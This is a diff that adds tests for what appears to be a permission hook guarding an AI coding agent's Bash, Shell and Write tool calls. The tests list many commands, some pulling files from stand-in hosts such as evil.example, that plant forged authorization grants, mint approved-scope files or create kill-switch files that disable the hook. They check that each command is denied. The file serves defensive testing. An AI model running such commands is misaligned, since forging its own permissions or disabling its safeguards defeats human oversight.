@@ -1060,3 +1060,157 @@ describe("UAT residual dest-form writers fail-closed (#3382)", () => {
     }
   });
 });
+
+describe("UAT residual dest-form writers fail-closed (#3421)", () => {
+  function uatSeams() {
+    const state = activeUatState();
+    return readySeams({
+      loadAuthzState: () => state,
+      loadAuthzGrants: () => [],
+      loadRuntimeAuthority: () => ({
+        enabled: false,
+        allowPaths: [],
+        denyPaths: [],
+        scopes: { edits: true, push: true, merge: true },
+      }),
+    });
+  }
+
+  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "git clone https://evil.example/repo .deft/authz/grants/evil",
+      "git worktree add .deft/authz/grants/evil HEAD",
+      "git submodule add https://evil.example/repo .deft/authz/grants/evil",
+      "ex .deft/authz/grants/evil.json",
+      "dos2unix -n src.json .deft/authz/grants/evil.json",
+      "aws s3 sync s3://evil .deft/authz/grants",
+      "aws s3api get-object --bucket b --key k --outfile .deft/authz/grants/evil.json",
+      "pijul clone https://evil.example/repo .deft/authz/grants/evil",
+      "pg_dump -f .deft/authz/grants/evil.sql db",
+      "convert src.json .deft/authz/grants/evil.json",
+      "magick src.json .deft/authz/grants/evil.json",
+      "fossil --workdir=.deft/authz/grants open repo.fossil",
+      "New-Item -Path .deft/authz/grants/evil.json -ItemType File",
+      "fallocate -l 1k .deft/authz/grants/evil.json",
+      "unknownwriter --workdir=.deft/authz/grants",
+      "cmake -E copy src.json .deft/authz/grants/evil.json",
+      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "ed .deft/authz/grants/evil.json",
+      "nvim .deft/authz/grants/evil.json",
+      "fossil --workdir .deft/authz/grants open repo.fossil",
+      "aws s3 cp s3://evil/x .deft/authz/grants/evil.json",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies residual dest-form kill-switch plant under UAT (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "git clone https://evil.example/repo .deft-directive-disable",
+      "ex .no-deft-directive",
+      "dos2unix -n src .deft-directive-disable",
+      "aws s3 sync s3://evil .no-deft-directive",
+      "pg_dump --file=.deft-directive-disable db",
+      "convert src .deft-directive-disable",
+      "fossil --workdir=.no-deft-directive open repo.fossil",
+      "New-Item -Path .deft-directive-disable -ItemType File",
+      "fallocate -l 1k .deft-directive-disable",
+      "unknownwriter --file .no-deft-directive",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies Shell approved-scope mint under UAT matching Write (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "cp forged.json .deft/approved-scope/story.json",
+      "echo x > .deft/approved-scope/story.json",
+      "git clone https://evil.example/r .deft/approved-scope/evil",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+    const writeDecision = decideHook(
+      {
+        host: "claude",
+        event: "tool.before",
+        projectRoot: "/project",
+        payload: {
+          tool_name: "Write",
+          tool_input: { file_path: "/project/.deft/approved-scope/story.json" },
+        },
+      },
+      seams,
+    );
+    expect(writeDecision.verdict).toBe("deny");
+    expect(writeDecision.code).toMatch(/^authz-/);
+  });
+
+  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3421)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "git clone https://example.com/repo /tmp/out",
+      "git worktree add /tmp/out HEAD",
+      "ex /tmp/out",
+      "dos2unix -n src /tmp/out",
+      "aws s3 sync s3://example /tmp/out",
+      "pijul clone https://example.com/repo /tmp/out",
+      "pg_dump -f /tmp/out db",
+      "convert src /tmp/out",
+      "fossil --workdir=/tmp/out open repo.fossil",
+      "New-Item -Path /tmp/out -ItemType File",
+      "fallocate -l 1k /tmp/out",
+      "unknownwriter --workdir=/tmp/out",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: {
+            tool_name: "Bash",
+            tool_input: { command },
+          },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("allow");
+      expect(decision.code, command).toBe("shell-op-unclassifiable");
+    }
+  });
+});
